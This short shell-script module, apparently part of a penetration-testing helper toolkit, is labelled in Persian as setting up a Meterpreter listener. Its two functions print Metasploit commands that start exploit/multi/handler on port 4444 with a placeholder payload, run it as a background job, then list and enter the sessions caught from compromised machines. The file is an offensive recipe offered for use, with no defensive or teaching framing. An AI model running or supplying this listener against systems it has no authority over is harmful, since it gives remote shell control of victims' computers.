DESC="راه‌اندازی شنونده مترپرتر"
REQ="msfconsole"
RISK="MED"

termux(){ echo "msfconsole -q -x 'use exploit/multi/handler; run'"; }

kali(){
cat <<'EOF'
msfconsole -q -x "
use exploit/multi/handler
set PAYLOAD <PAYLOAD>
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
"
sessions -l
sessions -i 1
EOF
}